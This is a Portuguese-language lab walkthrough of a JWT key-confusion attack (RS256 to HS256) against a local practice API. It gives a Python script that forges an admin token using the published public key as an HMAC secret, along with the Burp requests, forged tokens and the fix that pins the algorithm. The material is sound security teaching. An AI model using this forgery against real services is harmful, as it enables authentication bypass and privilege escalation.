# Walkthrough — jwt-key-confusion

Você vai pegar a chave **pública** da API — publicada de propósito, qualquer um pode baixá-la — e usá-la pra forjar um token `role: admin` que o servidor aceita como genuíno. Não porque a signature está quebrada (ela bate, matematicamente), não porque a chave é fraca (é uma chave RSA de 2048 bits) — mas porque o servidor deixa o **token** escolher com qual algoritmo verificar. Você diz "verifique isto como HMAC", e a chave pública — inofensiva como chave de *verificação* sob RSA — vira a chave de *assinar* sob HMAC. Nada está fraco. E mesmo assim abre.

Este átomo **fecha a trilogia JWT**:

- [`jwt-none-alg`](../jwt-none-alg/) — a fechadura não trancava (`alg:none`, verificação pulada).
- [`jwt-weak-secret`](../jwt-weak-secret/) — a fechadura trancava, mas a chave estava num post-it (secret HS256 fraco).
- **Aqui** — a fechadura tranca, a chave é forte, a signature bate — e mesmo assim abre.

É irmão do `jwt-none-alg` no *shape do bug e do fix* (os dois são o servidor confiando no `alg` do token), e irmão do `jwt-weak-secret` no *impacto* (escalação vertical pra admin).

## 1. Contexto

Uma API pequena com auth por JWT RS256. Quatro endpoints:

- `POST /login` — devolve um JWT RS256 carregando `{"sub": "alice", "role": "user"}`. Sem senha.
- `GET /jwks` — a chave **pública** RSA, em PEM. Publicada pra clientes verificarem tokens — e, aqui, o material com que você forja.
- `GET /api/profile` — qualquer token válido; ecoa suas claims. Seu baseline, e onde você captura o JWT.
- `GET /admin/users` — exige `role: admin`. Seu token `user` leva `403`; um token `admin` forjado leva `200`.

O servidor verifica tokens RS256 corretamente, rejeita uma signature adulterada com `401`, e rejeita `alg:none` (o truque do `jwt-none-alg`) com `401` também. Este átomo é **A02 — algorithm confusion (RS256 → HS256)**: o RSA e o HMAC são ambos sólidos; a única falha é que o servidor lê o campo `alg` do próprio token pra decidir com *qual* família de algoritmo verificar.

A trilha é **Burp** (logar, capturar o token, pegar o `/jwks`, replay da forja) mais um **terminal** (forjar o token). Não há browser: computar um HMAC sobre a chave pública é algo que o Burp não faz, então — exatamente como um browser executa JavaScript num bug client-side — a ferramenta que faz essa parte do trabalho entra na trilha principal. Os tokens abaixo são de uma sessão real; como estas claims não carregam timestamps e o RSA PKCS#1 v1.5 é determinístico, logar como `alice` te dá os mesmos bytes.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). O helper `verify` abre exatamente como o do `jwt-none-alg` — ele lê o header do próprio token e ramifica pelo `alg`:

```python
def verify(token):
    alg = jwt.get_unverified_header(token).get("alg")
    if alg == "HS256":
        header_b64, payload_b64, sig_b64 = token.split(".")
        signing_input = f"{header_b64}.{payload_b64}".encode()
        expected = hmac.new(PUBLIC_KEY_PEM, signing_input, hashlib.sha256).digest()
        if not hmac.compare_digest(expected, _b64url_decode(sig_b64)):
            raise ValueError("bad HS256 signature")
        return json.loads(_b64url_decode(payload_b64))
    if alg == "RS256":
        return jwt.decode(token, PUBLIC_KEY_PEM, algorithms=["RS256"])
    raise ValueError("unsupported alg")
```

Dois ramos, uma chave. O ramo `RS256` está correto: ele verifica com RSA usando a chave pública, que é exatamente pra *isso* que uma chave pública serve. O ramo `HS256` verifica por HMAC com **a mesma `PUBLIC_KEY_PEM`** — usando a chave pública como um secret compartilhado. E essa chave é *pública*: está servida em `/jwks`.

A pergunta de auditoria não é "ele verifica?" — verifica, corretamente, nos dois ramos. É **"quem escolhe qual ramo roda?"** A resposta é o token, no seu próprio header `alg` — um valor que o atacante escreve. É esse o bug inteiro. Guarde pro diff: o fix vai *parar de perguntar ao token* e fixar `algorithms=["RS256"]` — o mesmo movimento que o `jwt-none-alg` fez.

(Por que o ramo HS256 é feito na mão com `hmac` em vez de PyJWT? Porque o PyJWT moderno *se recusa* a fazer isso — veja a §6. Bugs de key confusion de verdade vivem exatamente nesse tipo de verificação escrita à mão.)

## 3. RS256 vs HS256 — por que a mesma chave significa duas coisas

O ataque inteiro monta na diferença entre os dois algoritmos:

- **RS256 é assimétrico.** A chave privada assina; a pública verifica. Saber *verificar* (a chave pública) não te diz nada sobre como *assinar* (a chave privada). Essa assimetria é exatamente por que é seguro publicar a chave pública — quem a tem só consegue *conferir* tokens, não *emitir*.
- **HS256 é simétrico.** Uma chave só, que assina e verifica. Verificar é assinar: quem consegue conferir um HMAC também consegue produzir um.

Agora colapse os dois. Quando o servidor é enganado a tratar a chave **pública** RSA como um **secret HMAC**, a assimetria some: a chave que só devia *verificar* vira a chave que *assina*. E o atacante tem essa chave — ela é pública. Mesmos bytes, dois algoritmos, dois significados de segurança completamente diferentes: inofensiva sob RS256, catastrófica sob HS256. (Pra a anatomia byte a byte de um JWT, veja o walkthrough do `jwt-none-alg`, §2 — este átomo não repete o primer inteiro.)

## 4. Baseline — a API funcionando (Repeater)

Aponte o Burp pra `127.0.0.1:8014` e trabalhe no Repeater. Logue como alice:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8014
Content-Type: application/json

{"user": "alice"}
```

Response — `200`, um token **RS256** (note `"alg":"RS256"` no header decodado):

```json
{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.tnNgD5Cwy4GGgWVYGaQT2gQJe5E8hL5njH0GRKmq6C2XskbmiBFt5LjxvjcwH4a9G--zrG_fcF3RoTaxe56kSkfyiVl2iottnIEv2XZB2fufqF196PRMqcMeShj4_vinY2JZah4s9Xn8jHz4fWn8I3BzKzVr85gqj1sCDs2xFVTYKc6Ca-Hxh2yFhmtvx_pgeyAX6vlr1bxpUqKgegjjexRDADlOLxjzmAKrRpz_pY82qZj0vhStZwKB_A94eCNlTFKxsVdViQsNZeaTBwcpPnOhbgF7mXchbQZIue6hEmRIzz-HXpLM3B83WAkf4EK0mOau95NT618C12hww23cPA"}
```

Decodado, o header e o payload são:

```
header  {"alg":"RS256","typ":"JWT"}
payload {"sub":"alice","role":"user"}
```

Confirme que o token funciona, depois tente o endpoint admin com ele (cole o token completo da response do login no lugar do truncado):

```
GET /api/profile HTTP/1.1
Host: 127.0.0.1:8014
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...C12hww23cPA
```

`200` — `{"role":"user","sub":"alice"}`. O mesmo token contra `/admin/users`:

```
GET /admin/users HTTP/1.1
Host: 127.0.0.1:8014
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...C12hww23cPA
```

`403`. Você está autenticado, mas o `role` é `user`. Esse é o baseline legítimo: o gate de role funciona.

## 5. Passo 1 — Pegue a chave pública (`GET /jwks`)

Isto é recon honesto — a chave é *pra* ser pública. Peça ela e salve o corpo exato da response:

```
GET /jwks HTTP/1.1
Host: 127.0.0.1:8014
```

Response — `200`, `Content-Type: application/x-pem-file`:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzbh9iGjria8A/I3yzjOj
G9zeWOTFNF/VUWzr4R28JAN+xJRkQlUFYNMoOxh+8t08u1L5Ab27gJxVj10e3Fzw
wYdqzPGA3KE1cqMMiJYfo9PMveCLt+6ofx5LiNunLz0oD/kImZS4orsM1Mt1mJ1C
NSStoUhsENdbzWfEHPsceEyPQyq0UJZyR0OEFo/mvbD4X8x2tTbuSFVyKJftDPok
t5kvGa/KkuJYg+A8Fe+rdok7So57swsnkh64LQ2HG8GFCuiVesfCnK9XRAplqRrU
uu7ynveXwu1vQtX6TS/PwT56Ug+UA6CvU3uB97ZU1v0LGyeQq5JlI1daUTKjN8/o
pQIDAQAB
-----END PUBLIC KEY-----
```

Salve esses bytes exatos num arquivo — `jwks.pem`. No Burp: copie o corpo da response tal como está. Do terminal:

```bash
curl -s http://127.0.0.1:8014/jwks -o jwks.pem
```

Nada aqui quebra um segredo. Você baixou um valor público, do jeito que o servidor quer. O ponto é o que vem a seguir: o servidor vai aceitar esse valor público como se fosse uma chave privada de assinatura.

## 6. Passo 2 — Forje o token (terminal)

Agora você monta um token `alg:HS256` com `role: admin` e o assina com um HMAC chaveado nos **bytes exatos da chave pública** que você acabou de salvar. Isso espelha o ramo HS256 do servidor com precisão — mesma chave, mesmo algoritmo, mesmo encoding:

```python
import base64, hmac, hashlib

# The EXACT bytes served by GET /jwks (save the response body to jwks.pem).
pub = open("jwks.pem", "rb").read()

def b64url(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=")

header = b64url(b'{"alg":"HS256","typ":"JWT"}')
payload = b64url(b'{"sub":"alice","role":"admin"}')
signing_input = header + b"." + payload
sig = b64url(hmac.new(pub, signing_input, hashlib.sha256).digest())
print((signing_input + b"." + sig).decode())
```

Rode. Ele imprime seu token admin forjado:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.LUEAPnztfFAk0dJU8BJBVUGPEDyf8VcaUx98QigGUE0
```

Decodado, o payload agora é `{"sub":"alice","role":"admin"}`.

**Por que na mão, e não um one-liner como no `jwt-weak-secret`?** Naquele átomo a forja era `jwt.encode({...}, secret, algorithm="HS256")` — o PyJWT aceita numa boa uma string como secret HMAC. Aqui o "secret" é uma chave pública RSA, e o PyJWT **recusa**:

```
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509
certificate and should not be used as an HMAC secret.
```

Essa recusa é o guard da lib moderna contra exatamente este ataque — e é o mesmo guard que o servidor vulnerável contornou ao fazer o HMAC na mão. Então o atacante também faz na mão (`hmac` da stdlib), ou pega uma ferramenta que faça. O **jwt_tool** ([ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)) tem um modo de exploit dedicado a key confusion (`-X k`, alimentado com a chave pública) que automatiza exatamente isso; o script explícito acima é mostrado pra você ver com precisão qual chave, qual encoding, qual algoritmo — a lição do "mesmos bytes" à vista.

## 7. Passo 3 — Replay do token forjado (Burp)

De volta ao Repeater, mande o token forjado pro endpoint admin:

```
GET /admin/users HTTP/1.1
Host: 127.0.0.1:8014
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.LUEAPnztfFAk0dJU8BJBVUGPEDyf8VcaUx98QigGUE0
```

Response — `200`, o dado restrito a admin:

```json
[{"role":"user","user":"alice"},{"role":"user","user":"bob"},{"role":"admin","user":"carol"}]
```

Escalação vertical confirmada. Você não quebrou o RSA e não quebrou o HMAC — você fez o servidor **verificar com a chave errada**, deixando o token escolher o algoritmo. O servidor computou `HMAC-SHA256(header.payload, PUBLIC_KEY_PEM)`, obteve exatamente os bytes que você computou com a mesma chave pública, e chamou isso de signature válida.

## 8. O que a vuln NÃO é

O exploit pode te empurrar pra a conclusão errada. Mate quatro delas — todas no Repeater.

**Não é cryptography quebrada.** O RSA está intacto, o HMAC-SHA256 está intacto, a chave é uma RSA completa de 2048 bits. Um token RS256 legítimo ainda verifica; um adulterado é rejeitado. Nada foi quebrado matematicamente — você usou um valor *público* de um jeito que o servidor nunca devia ter permitido.

**Não é chave fraca (isto não é o `jwt-weak-secret`).** Não há nada pra brute-forçar. Você não adivinhou nada; você *baixou* a chave do `/jwks`, porque ela é pública. Deixar a chave mais forte não muda nada — a falha é que ela é aceita sob o algoritmo errado.

**Não é `alg:none` (isto não é o `jwt-none-alg`).** Mande a forja clássica sem assinatura:

```
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

`401` — o servidor trata só `HS256` e `RS256`; qualquer outra coisa cai fora e é rejeitada. Mas note o *parentesco*: o `jwt-none-alg` e este átomo são a mesma doença — o servidor confiando no `alg` do token. Lá o token dizia "não verifique"; aqui ele diz "verifique com esta família". Mesma confiança, sintoma diferente.

**É puramente o branch controlado pelo `alg`.** A prova cirúrgica: pegue seu token forjado e mude só o `alg` do header de `HS256` pra `RS256`, mantendo a mesma signature HMAC:

```
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.LUEAPnztfFAk0dJU8BJBVUGPEDyf8VcaUx98QigGUE0
```

- forjado, `alg:HS256` → `200`
- mesma signature, `alg` do header trocado pra `RS256` → `401` (o ramo RS256 verifica os bytes HMAC como se fossem uma signature RSA, e falha)

A única coisa que mudou foi qual ramo o servidor escolheu rodar — e essa escolha é do token. É essa a vulnerabilidade inteira.

A trilogia, tornada concreta:

| | `jwt-none-alg` | `jwt-weak-secret` | `jwt-key-confusion` (aqui) |
|---|---|---|---|
| A fechadura | não trancava (`alg:none`) | tranca; chave num post-it | tranca; chave forte; signature bate |
| O que é fraco | a verificação (pulada) | o valor do secret | **nada** |
| O ataque | **arranca** a signature | **refaz** com a chave quebrada | **refaz** com a chave *pública* como secret HMAC |
| Causa raiz | confia no `alg` do token | o secret não tem entropia | confia no `alg` do token |

As colunas da esquerda e da direita compartilham uma causa raiz — *confiar no `alg` do token* — que é por que o `jwt-none-alg` e este átomo também compartilham um fix.

## 9. Impacto

Escalação vertical de privilégio. Com a chave pública — que é *pública* — você forja **qualquer** token: qualquer `sub`, qualquer `role`, qualquer claim em que a app confia. Você não leu o dado de outro usuário do mesmo nível (essa é a escalação horizontal que os átomos de IDOR/BOLA ensinam); você *virou administrador*, e poderia virar qualquer um. Na prática você é dono da autenticação da app. **Não é RCE** — sem execução de código — mas pra um sistema de auth é quase total.

O que faz deste o clímax da trilogia não é um impacto maior — é a mesma escalação vertical do `jwt-weak-secret`. É que **nada está fraco**: uma chave forte, uma signature que verifica de verdade, algoritmos sólidos — e mesmo assim cai, numa única linha de confiança mal colocada.

## 10. Por que o fix funciona

Rode a cadeia contra a API fixed na porta **8114** (veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md)). Ela é byte-idêntica exceto pelo helper `verify`, que agora fixa o algoritmo em vez de lê-lo do token:

```python
def verify(token):
    return jwt.decode(token, PUBLIC_KEY_PEM, algorithms=["RS256"])
```

- **Replay do seu token forjado `alg:HS256`** → `401`. O PyJWT ignora a claim `alg` do token e impõe a allowlist; `HS256` não está nela, então o token é rejeitado antes de qualquer HMAC ser computado. A chave pública agora é só uma chave de *verificação* — nunca um secret HMAC.
- **Um token RS256 legítimo** ainda leva `200` no `/api/profile` e `403` no `/admin/users` — o gate de role está de pé.
- Todo o resto é igual: mesmo par de chaves, mesmos endpoints, mesmo `/jwks`.

Este é o **mesmo shape de fix do `jwt-none-alg`**: os dois param de ramificar pelo `header["alg"]` e fixam uma allowlist positiva `algorithms=`, deixando a lib impor. A regra do `jwt-none-alg` vale sem mudança aqui — *o servidor decide quais algoritmos aceita, antes de ler o token; o que o token afirma sobre o próprio algoritmo é uma dica, não uma diretiva.* O header é dado, não policy. Veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra por que o servidor vulnerável verificava na mão pra começo de conversa.
